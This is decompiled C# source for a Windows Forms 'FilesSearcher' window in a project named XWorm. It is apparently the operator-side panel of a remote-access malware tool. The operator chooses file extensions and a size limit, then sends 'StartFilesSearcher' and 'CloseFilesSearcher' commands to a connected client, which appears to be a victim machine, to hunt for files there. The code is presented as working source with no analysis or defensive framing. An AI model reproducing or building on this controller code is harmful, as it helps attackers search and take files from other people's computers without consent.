using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000010 RID: 16
	[DesignerGenerated]
	public partial class FilesSearcher : Form
	{
		// Token: 0x060000DB RID: 219 RVA: 0x000082F8 File Offset: 0x000064F8
		public FilesSearcher()
		{
			base.FormClosing += this.FilesSearcher_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x1700005E RID: 94
		// (get) Token: 0x060000DE RID: 222 RVA: 0x00009002 File Offset: 0x00007202
		// (set) Token: 0x060000DF RID: 223 RVA: 0x0000900C File Offset: 0x0000720C
		internal virtual ListBox ListBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700005F RID: 95
		// (get) Token: 0x060000E0 RID: 224 RVA: 0x00009015 File Offset: 0x00007215
		// (set) Token: 0x060000E1 RID: 225 RVA: 0x0000901F File Offset: 0x0000721F
		internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000060 RID: 96
		// (get) Token: 0x060000E2 RID: 226 RVA: 0x00009028 File Offset: 0x00007228
		// (set) Token: 0x060000E3 RID: 227 RVA: 0x00009032 File Offset: 0x00007232
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000061 RID: 97
		// (get) Token: 0x060000E4 RID: 228 RVA: 0x0000903B File Offset: 0x0000723B
		// (set) Token: 0x060000E5 RID: 229 RVA: 0x00009045 File Offset: 0x00007245
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000062 RID: 98
		// (get) Token: 0x060000E6 RID: 230 RVA: 0x0000904E File Offset: 0x0000724E
		// (set) Token: 0x060000E7 RID: 231 RVA: 0x00009058 File Offset: 0x00007258
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000063 RID: 99
		// (get) Token: 0x060000E8 RID: 232 RVA: 0x00009061 File Offset: 0x00007261
		// (set) Token: 0x060000E9 RID: 233 RVA: 0x0000906B File Offset: 0x0000726B
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000064 RID: 100
		// (get) Token: 0x060000EA RID: 234 RVA: 0x00009074 File Offset: 0x00007274
		// (set) Token: 0x060000EB RID: 235 RVA: 0x00009080 File Offset: 0x00007280
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000065 RID: 101
		// (get) Token: 0x060000EC RID: 236 RVA: 0x000090C3 File Offset: 0x000072C3
		// (set) Token: 0x060000ED RID: 237 RVA: 0x000090CD File Offset: 0x000072CD
		internal virtual Panel Panel5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000066 RID: 102
		// (get) Token: 0x060000EE RID: 238 RVA: 0x000090D6 File Offset: 0x000072D6
		// (set) Token: 0x060000EF RID: 239 RVA: 0x000090E0 File Offset: 0x000072E0
		internal virtual Guna2Panel Guna2Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x060000F0 RID: 240 RVA: 0x000090E9 File Offset: 0x000072E9
		// (set) Token: 0x060000F1 RID: 241 RVA: 0x000090F4 File Offset: 0x000072F4
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x060000F2 RID: 242 RVA: 0x00009137 File Offset: 0x00007337
		// (set) Token: 0x060000F3 RID: 243 RVA: 0x00009141 File Offset: 0x00007341
		internal virtual Guna2Panel Guna2Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x060000F4 RID: 244 RVA: 0x0000914A File Offset: 0x0000734A
		// (set) Token: 0x060000F5 RID: 245 RVA: 0x00009154 File Offset: 0x00007354
		internal virtual Guna2Panel Guna2Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x060000F6 RID: 246 RVA: 0x0000915D File Offset: 0x0000735D
		// (set) Token: 0x060000F7 RID: 247 RVA: 0x00009167 File Offset: 0x00007367
		internal virtual Guna2NumericUpDown Guna2NumericUpDown1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x060000F8 RID: 248 RVA: 0x00009170 File Offset: 0x00007370
		// (set) Token: 0x060000F9 RID: 249 RVA: 0x0000917A File Offset: 0x0000737A
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x060000FA RID: 250 RVA: 0x00009183 File Offset: 0x00007383
		// (set) Token: 0x060000FB RID: 251 RVA: 0x00009190 File Offset: 0x00007390
		internal virtual ToolStripMenuItem ToolStripMenuItem7
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem7;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem7_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem7;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem7 = value;
				toolStripMenuItem = this._ToolStripMenuItem7;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700006D RID: 109
		// (get) Token: 0x060000FC RID: 252 RVA: 0x000091D3 File Offset: 0x000073D3
		// (set) Token: 0x060000FD RID: 253 RVA: 0x000091E0 File Offset: 0x000073E0
		internal virtual ToolStripMenuItem AddToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._AddToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.AddToolStripMenuItem1_Click);
				ToolStripMenuItem addToolStripMenuItem = this._AddToolStripMenuItem1;
				if (addToolStripMenuItem != null)
				{
					addToolStripMenuItem.Click -= value2;
				}
				this._AddToolStripMenuItem1 = value;
				addToolStripMenuItem = this._AddToolStripMenuItem1;
				if (addToolStripMenuItem != null)
				{
					addToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700006E RID: 110
		// (get) Token: 0x060000FE RID: 254 RVA: 0x00009223 File Offset: 0x00007423
		// (set) Token: 0x060000FF RID: 255 RVA: 0x00009230 File Offset: 0x00007430
		internal virtual ToolStripMenuItem RemoveToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RemoveToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RemoveToolStripMenuItem1_Click);
				ToolStripMenuItem removeToolStripMenuItem = this._RemoveToolStripMenuItem1;
				if (removeToolStripMenuItem != null)
				{
					removeToolStripMenuItem.Click -= value2;
				}
				this._RemoveToolStripMenuItem1 = value;
				removeToolStripMenuItem = this._RemoveToolStripMenuItem1;
				if (removeToolStripMenuItem != null)
				{
					removeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000100 RID: 256 RVA: 0x00009274 File Offset: 0x00007474
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000101 RID: 257 RVA: 0x000092CC File Offset: 0x000074CC
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			bool flag = this.ListBox1.Items.Count > 0 & this.Guna2NumericUpDown1.Text.Length > 0;
			if (flag)
			{
				this.Guna2GradientButton1.Enabled = false;
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.Clear();
				try
				{
					foreach (object value in this.ListBox1.Items)
					{
						string str = Conversions.ToString(value);
						stringBuilder.Append("-=>" + str);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"StartFilesSearcher",
					SettingsHelper.SPL,
					this.Guna2NumericUpDown1.Value.ToString(),
					"000000",
					SettingsHelper.SPL,
					stringBuilder.ToString()
				}));
				FilesSearcher._Closure$__R74-0 CS$<>8__locals1 = new FilesSearcher._Closure$__R74-0(CS$<>8__locals1);
				CS$<>8__locals1.$VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x06000102 RID: 258 RVA: 0x00009408 File Offset: 0x00007608
		private void ToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			this.ListBox1.Items.Clear();
		}

		// Token: 0x06000103 RID: 259 RVA: 0x0000941C File Offset: 0x0000761C
		private void AddToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string defaultResponse = ".jpg";
			string text = Interaction.InputBox("Add Extension", "Files Searcher", defaultResponse, -1, -1);
			bool flag = text.Length == 0;
			if (!flag)
			{
				bool flag2 = this.ListBox1.Items.Contains(text);
				if (!flag2)
				{
					this.ListBox1.Items.Add(text);
				}
			}
		}

		// Token: 0x06000104 RID: 260 RVA: 0x00009484 File Offset: 0x00007684
		private void RemoveToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				while (this.ListBox1.SelectedItems.Count > 0)
				{
					this.ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(this.ListBox1.SelectedItem));
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000105 RID: 261 RVA: 0x000094FC File Offset: 0x000076FC
		private void FilesSearcher_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseFilesSearcher");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0400006A RID: 106
		public Client C;
	}
}
